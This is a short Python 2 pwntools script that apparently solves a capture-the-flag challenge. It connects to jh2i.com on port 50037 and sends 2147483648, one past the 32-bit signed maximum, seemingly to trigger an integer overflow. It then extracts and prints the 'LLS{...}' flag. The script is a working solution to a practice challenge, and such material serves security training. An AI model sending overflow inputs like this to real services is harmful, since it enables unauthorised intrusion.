#!/usr/bin/env python2
from pwn import *
import re


def solve():

    r = remote('jh2i.com', 50037)
    r.send('2147483648\n')
    output = r.recvall()
    result = [c for c in output.split('\n') if 'LLS{' in c][0]
    m = re.search(r'LLS\{.*\}', result)
    print("flag: %s" % m.group())


if __name__ == '__main__':
    solve()
